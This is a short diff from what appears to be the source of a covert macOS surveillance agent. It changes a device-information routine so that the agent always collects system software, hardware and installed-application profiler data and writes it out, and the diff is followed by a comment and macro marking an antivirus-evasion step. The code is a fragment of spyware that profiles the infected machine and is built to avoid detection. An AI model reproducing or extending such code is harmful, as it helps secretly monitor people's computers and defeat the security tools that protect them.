@@ -102,25 +102,32 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
  
     NSData *infoData = nil;
     
-    if (gOSMajor >= 10 && gOSMinor >= 9)
-    {
+    /*
+    if (gOSMajor >= 10 && gOSMinor >= 6)
+    {*/
         // osx >= 10.9
-        NSMutableData *infoSys = (NSMutableData*)[self getSystemProfilerInfo:@"SPSoftwareDataType"];
-        NSMutableData *infoApp = (NSMutableData*)[self getSystemProfilerInfo:@"SPApplicationsDataType"];
-        NSMutableData *tmpData = [[NSMutableData alloc]init];
-        if (tmpData != nil) {
-            [tmpData appendData:infoSys];
-            [tmpData appendData:infoApp];
-        }
-        infoData = [[NSData alloc ]initWithData:tmpData];
-        [tmpData release];
-        [infoSys release];
-        [infoApp release];
-        if (infoData !=nil)
-        {
-            [self writeProfilerInfo: infoData];
-        }
+    NSMutableData *infoSys = (NSMutableData*)[self getSystemProfilerInfo:@"SPSoftwareDataType"];
+    NSMutableData *infoHw = (NSMutableData*)[self getSystemProfilerInfo:@"SPHardwareDataType"];
+    NSMutableData *infoApp = (NSMutableData*)[self getSystemProfilerInfo:@"SPApplicationsDataType"];
+    NSMutableData *tmpData = [[NSMutableData alloc]init];
+    if (tmpData != nil)
+    {
+        [tmpData appendData:infoHw];
+        [tmpData appendData:infoSys];
+        NSString *appString = @" Applications:\n\n";
+        [tmpData appendData:[appString dataUsingEncoding:NSUTF8StringEncoding]];
+        [tmpData appendData:infoApp];
     }
+    infoData = [[NSData alloc ]initWithData:tmpData];
+    [tmpData release];
+    [infoSys release];
+    [infoHw release];
+    [infoApp release];
+    if (infoData !=nil)
+    {
+        [self writeProfilerInfo: infoData];
+    }
+    /*}
     else
     {
         // the old good way
@@ -129,7 +136,7 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
         {
             [self writeDeviceInfo: infoData];
         }
-    }
+    }*/
     
     // AV evasion: only on release build
     AV_GARBAGE_005
